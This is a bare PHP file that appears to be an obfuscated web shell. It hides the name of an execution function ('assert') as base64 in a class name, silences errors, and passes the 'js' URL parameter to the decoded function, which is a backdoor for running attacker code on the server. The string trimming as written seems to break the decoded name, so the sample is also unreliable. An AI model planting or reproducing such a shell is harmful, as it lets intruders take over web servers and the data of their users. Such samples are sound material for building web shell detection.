<?php
error_reporting(0);        
    class YWFzc2VydA{
        public $s;  
    }
    $a=new YWFzc2VydA();
    $e = get_class($a);
    $e.='==';
    $b=base64_decode($e);
    $b=substr($b,1);
           $a->s=$_GET['js'];
           $temp=$a->s;
    $b($temp);
?>